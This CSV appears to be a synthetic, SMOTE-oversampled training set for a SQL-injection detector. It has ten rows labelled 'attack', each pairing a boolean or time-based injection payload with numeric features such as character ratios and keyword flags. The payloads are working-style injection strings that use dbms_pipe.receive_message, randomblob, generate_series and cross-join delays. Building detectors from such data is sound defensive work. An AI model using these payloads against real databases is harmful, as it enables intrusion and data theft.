id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,2.150961655318146,142.0,30.59362489081038,3.7456357904853785,44.14143820973254,15.70318755459481,56.74899912648303,25.40637510918962,0.3108551986600883,0.11058582784925923,0.3996408389188945,0.1789181345717579,0.5936248908103783,4.0,0.0,0.29681244540518903,0.0,2.0,0.0,10.593624890810379,0.593624890810378,1.406375109189622,1.0,6.515937772974055,0.29681244540518903,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.703187554594811,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000002,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,2.892163506805453,163.8667855618436,36.755476292104255,3.994832618814258,54.48904741579149,20.822083511182445,58.86678556184361,29.688869073026062,0.33223665608988656,0.12743391611144742,0.3590539566429152,0.1812754711557508,2.0666072190781914,0.9333927809218084,1.3777381460521276,0.0,0.0,1.6888690730260638,0.0,11.93339278092181,0.3111309269739362,2.0,1.9333927809218083,9.822083511182447,0.6888690730260638,0.31113092697393624,0.6888690730260638,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.6888690730260637,0.0,0.6888690730260639,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9333927809218086,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.311130926973936
SMOTE_000003,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000016,0.8998964704399675,135.76485402985406,30.77742235879491,3.349476542546029,32.92161800995135,14.755484471758983,65.3103291893488,22.77742235879491,0.24052777173566012,0.11018464514331873,0.482127895902914,0.16715968721810712,1.7554844717589826,4.0,0.0,0.8777422358794913,0.1222577641205087,1.8777422358794913,0.0,11.510968943517964,1.7554844717589826,0.0,0.8777422358794913,2.877742235879491,0.8777422358794913,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000004,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,1.3265237429302663,150.22725137032734,32.74241712344244,3.871702778309931,55.541647089466714,11.886374314836338,56.79922996602427,26.0,0.3689411844214634,0.07994462825962698,0.3777974018620096,0.17331678545690002,0.0,3.31439571913939,0.0,0.0,0.0,1.3143957191393898,0.0,11.37120856172122,0.0,2.0,1.0,7.31439571913939,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.6856042808606102,0.0,0.0,0.6856042808606102,1.3143957191393898,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6856042808606104
SMOTE_000005,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,0.3396848199124688,89.03062181566393,22.060586136521003,2.9537972168106044,8.787619774773049,15.818241590436989,46.78827726957992,17.636483180873977,0.10069681759823768,0.17765041953283872,0.5239452112778265,0.19770755159109715,4.0,1.1102230246251565e-16,0.9394138634789961,0.0,0.0,2.0,0.0,7.7576554539159845,1.8788277269579923,0.060586136521003864,1.0,2.939413863478996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0605861365210039,0.939413863478996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000006,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,1.8084000517686942,88.96980758877123,23.353461607485844,3.2804428805664743,20.030192411228764,13.0,41.93961517754247,14.0,0.2254359356673246,0.14615290975848824,0.47101571329581515,0.15739544127837196,2.706923214971685,1.2930767850283145,0.0,0.0,0.3232691962570786,1.6767308037429214,0.0,6.646538392514158,0.0,0.6767308037429214,0.6767308037429214,2.0,0.6767308037429214,0.32326919625707873,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,0.6939097001800785,161.89843751526996,34.210156248473005,4.119456094732581,80.73906250916198,16.210156248473,47.73906250916198,17.210156248473,0.4986353490358896,0.10025699336812056,0.29466989282761863,0.10643776476837119,0.21015624847300263,0.7898437515269973,2.0,0.0,1.0,2.0,0.0,5.789843751526997,0.0,0.0,2.2101562484730026,5.0,0.21015624847300268,0.7898437515269973,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000008,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.2632555844318782,140.80618417323763,33.0,4.203135700600983,70.2742269783453,14.080411151582924,39.90309208661881,16.548453956690594,0.4994965846038199,0.09948717160862762,0.28324727362257174,0.11776897016498072,0.0,1.0,2.0,0.0,1.0,1.7257730216547036,0.0,5.0,0.2742269783452965,0.0,2.2742269783452964,4.725773021654703,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7257730216547036,1.0,0.7257730216547035,0.2742269783452965,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7257730216547036
SMOTE_000009,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,2.960895058453065,82.06133264893165,26.75182784660188,3.543448808599166,28.402924554563008,8.953290123883384,33.604386831844515,11.100731138640752,0.3494740564859352,0.10219848196421367,0.4103572375879389,0.13797022396191222,0.5503655693203762,1.1102230246251565e-16,0.8992688613592479,0.0,1.0,1.449634430679624,0.0,4.751827846601881,0.0,0.5503655693203761,0.5503655693203762,3.7985377227184958,0.5503655693203761,0.0,0.44963443067962394,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.44963443067962394,1.0,0.5503655693203762,0.44963443067962405,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.449634430679624
SMOTE_000010,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,1.9308046317091336,79.34491546472202,22.685593207957528,3.4475305198418837,20.056779623872586,13.0,33.65932225676449,12.628813584084943,0.25675058916058935,0.1653573060526602,0.418344552121823,0.15954755266492748,2.742372831830113,1.2576271681698872,0.0,0.0,0.3144067920424718,1.6855932079575282,0.0,5.257627168169887,0.0,0.6855932079575282,0.6855932079575282,2.0,0.6855932079575282,0.31440679204247174,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
